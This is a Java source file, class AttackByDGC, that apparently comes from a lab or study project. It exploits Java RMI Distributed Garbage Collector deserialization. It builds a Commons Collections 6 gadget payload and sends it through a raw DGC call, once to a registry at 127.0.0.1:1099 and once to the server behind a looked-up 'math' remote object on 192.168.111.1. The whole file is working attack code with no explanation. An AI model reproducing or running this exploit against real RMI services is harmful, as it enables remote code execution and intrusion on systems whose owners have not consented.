package com.dem0.vuln;

import com.dem0.internal.ReflectUtils;
import de.qtc.rmg.networking.RMIRegistryEndpoint;
import de.qtc.rmg.utils.RemoteObjectWrapper;

import java.rmi.server.ObjID;

import static com.dem0.rmi.Main.sendRawCall;

public class AttackByDGC {
    public static void  attackRegister() throws Exception {
        String registryHost = "127.0.0.1";
        int registryPort = 1099;
        final Object payloadObject = new CC6().getPayload();
        ObjID objID = new ObjID(2);
        sendRawCall(registryHost, registryPort,  objID, 0, -669196253586618813L,payloadObject);
    }
    public static void attackServer() throws Exception {

        ReflectUtils.enableCustomRMIClassLoader();
        RMIRegistryEndpoint rmiRegistry = new RMIRegistryEndpoint("192.168.111.1",1099);
        RemoteObjectWrapper remoteObj = new RemoteObjectWrapper(rmiRegistry.lookup("math"),"math");
        Object payloadObject = new CC6().getPayload();
        ObjID objID = new ObjID(2);
        sendRawCall(remoteObj.getHost(), remoteObj.getPort(),  objID, 0, -669196253586618813L,payloadObject);
    }

    public static void main(String[] args) throws Exception {
        attackRegister();
    }
}
